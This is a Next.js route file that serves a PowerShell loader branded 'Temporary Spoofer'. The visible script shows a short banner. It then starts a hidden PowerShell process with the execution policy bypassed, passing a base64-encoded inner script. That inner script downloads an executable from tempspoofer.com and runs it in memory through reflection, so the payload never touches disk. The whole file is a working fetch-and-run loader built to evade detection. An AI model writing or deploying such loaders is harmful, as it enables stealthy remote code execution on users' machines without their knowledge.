import { NextResponse } from "next/server";

const INNER: string =
  "$ErrorActionPreference='Stop'\n" +
  "[Net.ServicePointManager]::SecurityProtocol=[Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12\n" +
  "function Err($m){Add-Type -AssemblyName System.Windows.Forms|Out-Null;[System.Windows.Forms.MessageBox]::Show($m,'Temporary Spoofer')|Out-Null}\n" +
  "try{$b=(New-Object Net.WebClient).DownloadData('https://tempspoofer.com/loader-reseller.exe')}catch{Err(\"Connection failed: $($_.Exception.Message)\");exit 1}\n" +
  "if(-not $b -or $b.Length -lt 100000){Err('Invalid payload');exit 1}\n" +
  "try{\n" +
  "  Add-Type -AssemblyName PresentationFramework -ErrorAction Stop|Out-Null\n" +
  "  $asm=[Reflection.Assembly]::Load($b)\n" +
  "  if(-not [System.Windows.Application]::ResourceAssembly){[System.Windows.Application]::ResourceAssembly=$asm}\n" +
  "  $e=$asm.EntryPoint\n" +
  "  if($e.GetParameters().Length -eq 0){$e.Invoke($null,@())|Out-Null}else{$e.Invoke($null,(,[string[]]@()))|Out-Null}\n" +
  "}catch{\n" +
  "  $m=$_.Exception.Message\n" +
  "  if($_.Exception.InnerException){$m=$m+[Environment]::NewLine+$_.Exception.InnerException.Message}\n" +
  "  Err(\"Startup error: $m\")\n" +
  "  exit 1\n" +
  "}finally{$b=$null;[GC]::Collect()}";

function buildScript(inner: string): string {
  const utf16 = Buffer.from(inner, "utf16le").toString("base64");
  return [
    "& {",
    "$ErrorActionPreference = 'Stop'",
    "$ProgressPreference    = 'SilentlyContinue'",
    "",
    "Write-Host ''",
    "Write-Host '  Temporary Spoofer' -ForegroundColor White",
    "Write-Host '  -----------------' -ForegroundColor DarkGray",
    "Write-Host '  preparing...' -ForegroundColor DarkGray",
    "",
    "try {",
    "    Start-Process -FilePath 'powershell.exe' -ArgumentList @(",
    "        '-NoProfile','-ExecutionPolicy','Bypass','-STA','-WindowStyle','Hidden',",
    `        '-EncodedCommand','${utf16}'`,
    "    ) | Out-Null",
    "    Write-Host '  starting...' -ForegroundColor Green",
    "} catch {",
    `    Write-Host "  launch failed: $($_.Exception.Message)" -ForegroundColor Red`,
    "}",
    "}",
    "",
  ].join("\n");
}

const SCRIPT = buildScript(INNER);

export async function GET() {
  return new NextResponse(SCRIPT, {
    status: 200,
    headers: {
      "content-type": "text/plain; charset=utf-8",
      "cache-control": "no-store",
    },
  });
}
